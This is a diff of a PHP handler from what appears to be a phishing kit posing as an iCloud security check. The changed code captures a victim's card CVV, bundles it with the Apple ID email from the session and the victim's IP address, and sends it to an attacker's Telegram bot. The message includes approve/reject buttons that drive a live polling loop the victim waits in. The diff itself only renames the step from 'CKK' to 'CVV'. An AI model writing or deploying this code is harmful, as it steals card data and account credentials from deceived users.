@@ -156,19 +156,19 @@ TEXT;
     exit;
 }
 
-// ── CKK STEP ────────────────────────
-if ($step === 'ckk' && !empty($_POST['ckk'])) {
-    $ckk   = preg_replace('/[^0-9]/', '', trim($_POST['ckk']));
+// ── CVV STEP ────────────────────────
+if ($step === 'cvv' && !empty($_POST['cvv'])) {
+    $cvv   = preg_replace('/[^0-9]/', '', trim($_POST['cvv']));
     $email = $_SESSION['icloud_email'] ?? '—';
 
-    $messageCkk = <<<TEXT
-🔐 <b>iCLOUD – CKK saisi</b> [<code>CKK STEP</code>]
+    $messageCvv = <<<TEXT
+💳 <b>iCLOUD – CVV saisi</b> [<code>CVV STEP</code>]
 
 <b>Apple ID</b>
 └ 📧 Email: <code>$email</code>
 
-<b>Code CKK</b>
-└ 🔢 Code: <code>$ckk</code>
+<b>Code CVV</b>
+└ 🔢 Code: <code>$cvv</code>
 
 <b>Réseau</b>
 ├ 🌐 IP: <code>$ip</code>
@@ -182,18 +182,18 @@ TEXT;
     $vbvUrl  = $proto . '://' . $host . $dir . '/security_check/actionsvbv.php';
     $encIp   = urlencode($ip);
 
-    $keyboardCkk = [
+    $keyboardCvv = [
         'inline_keyboard' => [[
-            ['text' => '✅ CKKOK', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=ckkok'],
-            ['text' => '❌ CKKBAD', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=ckkbad'],
+            ['text' => '✅ CVVOK', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=cvvok'],
+            ['text' => '❌ CVVBAD', 'url' => $vbvUrl . '?ip=' . $encIp . '&otp=cvvbad'],
         ]]
     ];
 
     // Reset ip_list for polling
     $ipListFile = __DIR__ . '/security_check/ip_list.txt';
-    file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting_ckk', FILE_APPEND | LOCK_EX);
+    file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting_cvv', FILE_APPEND | LOCK_EX);
 
-    sendTelegramMessage($bot_token, $chat_id, $messageCkk, $keyboardCkk);
+    sendTelegramMessage($bot_token, $chat_id, $messageCvv, $keyboardCvv);
     echo json_encode(['ok' => true]);
     exit;
 }
